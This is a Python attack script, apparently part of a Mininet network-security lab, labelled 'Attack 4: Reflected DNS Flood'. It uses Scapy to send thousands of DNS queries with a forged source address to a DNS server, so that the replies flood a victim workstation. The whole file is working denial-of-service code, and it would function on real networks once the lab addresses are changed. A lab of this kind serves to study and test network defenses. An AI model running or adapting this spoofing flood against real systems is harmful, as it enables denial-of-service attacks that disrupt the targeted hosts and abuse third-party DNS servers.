#!/usr/bin/env python3
"""
Attack 4: Reflected DNS Flood
Sends spoofed DNS requests to the DMZ DNS server so that replies are sent to
the victim workstation instead of the real sender.

Uses Scapy for packet crafting -- no external attack tools.

Usage (from mininet CLI):
    internet python3 attacks/attack_4.py
"""

import time

from scapy.all import DNS, DNSQR, IP, RandShort, UDP, conf, send

conf.verb = 0

VICTIM_IP = "10.1.0.2"
DNS_SERVER_IP = "10.12.0.20"
DNS_PORT = 5353
COUNT = 5000
DELAY = 0.001


def build_spoofed_dns_query():
    """
    Build one DNS request with the victim IP as forged source.
    The DNS server will reflect its response to VICTIM_IP.
    """
    return (
        IP(src=VICTIM_IP, dst=DNS_SERVER_IP)
        / UDP(sport=RandShort(), dport=DNS_PORT)
        / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))
    )


def reflected_dns_flood():
    """Send many spoofed DNS requests to trigger reflected replies."""
    print("[*] Reflected DNS flood")
    print(f"[*] Reflector : {DNS_SERVER_IP}:{DNS_PORT}")
    print(f"[*] Victim    : {VICTIM_IP}")
    print(f"[*] Requests  : {COUNT}\n")

    for attempt in range(1, COUNT + 1):
        send(build_spoofed_dns_query(), verbose=False)

        if attempt % 500 == 0 or attempt == COUNT:
            print(f"  Sent {attempt} spoofed DNS requests")

        time.sleep(DELAY)

    print("\n[+] Attack finished")


def main():
    reflected_dns_flood()


if __name__ == "__main__":
    main()
